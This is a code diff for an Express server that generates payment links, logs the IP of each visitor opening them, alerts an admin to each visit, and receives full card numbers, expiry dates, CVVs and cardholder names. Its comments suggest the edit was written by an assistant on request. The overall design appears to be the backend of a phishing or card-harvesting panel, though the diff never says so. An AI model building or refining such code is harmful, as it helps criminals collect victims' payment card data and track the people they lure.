@@ -46,22 +46,22 @@ app.use(cors({
   methods: ['GET', 'POST']
 }));
 
-// Middleware to track visitors and their IP addresses
+// Track visitors middleware
 app.use((req, res, next) => {
   // Get visitor IP address
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   
-  // Track page visits with payment ID
-  if (req.path === '/landing.html' && req.query.pid) {
+  // Track visits to landing page or any payment page
+  if ((req.path === '/landing.html' || req.path.includes(PAYMENT_REDIRECT_FILE)) && req.query.pid) {
     const pid = req.query.pid;
     const timestamp = new Date().toLocaleString();
     
     // Store visitor info
     visitors.set(pid, { 
+      pid,
       ip, 
-      timestamp, 
-      url: req.originalUrl, 
-      userAgent: req.headers['user-agent'] 
+      timestamp,
+      url: req.originalUrl
     });
     
     // Notify admin of visitor
@@ -73,6 +73,8 @@ app.use((req, res, next) => {
         url: req.originalUrl 
       });
     }
+    
+    console.log(`Visitor tracked: ${ip} accessing ${pid}`);
   }
   
   next();
@@ -93,10 +95,20 @@ const paymentLinks = new Map();
 
 // Endpoint to get visitor info
 app.get('/api/visitors', (req, res) => {
-  res.json(Array.from(visitors.entries()).map(([pid, data]) => ({
-    pid,
-    ...data
-  })));
+  try {
+    const visitorList = Array.from(visitors.values()).map(visitor => ({
+      pid: visitor.pid,
+      ip: visitor.ip,
+      timestamp: visitor.timestamp,
+      url: visitor.url || ''
+    }));
+    
+    console.log(`Sending ${visitorList.length} visitors to admin`);
+    res.json(visitorList);
+  } catch (error) {
+    console.error('Error getting visitors:', error);
+    res.status(500).json({ error: 'Failed to get visitors' });
+  }
 });
 
 // Payment Links Endpoints - ONLY modify this function
@@ -132,7 +144,16 @@ app.post('/api/generatePaymentLink', (req, res) => {
   }
 });
 
-// Add IP address to transaction data
+// The rest of your code remains completely unchanged
+app.get('/api/getPaymentDetails', (req, res) => {
+  const { pid } = req.query;
+  if (!pid || !paymentLinks.has(pid)) {
+    return res.status(404).json({ status: "error", message: "Not found" });
+  }
+  res.json({ status: "success", payment: paymentLinks.get(pid) });
+});
+
+// Transactions Endpoints
 app.post('/api/sendPaymentDetails', (req, res) => {
   try {
     const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
@@ -172,15 +193,6 @@ app.post('/api/sendPaymentDetails', (req, res) => {
     console.error('Transaction Error:', error);
     res.status(500).json({ status: "error", message: "Payment processing failed" });
   }
-});
-
-// The rest of your code remains completely unchanged
-app.get('/api/getPaymentDetails', (req, res) => {
-  const { pid } = req.query;
-  if (!pid || !paymentLinks.has(pid)) {
-    return res.status(404).json({ status: "error", message: "Not found" });
-  }
-  res.json({ status: "success", payment: paymentLinks.get(pid) });
 });
 
 app.get('/api/transactions', (req, res) => {
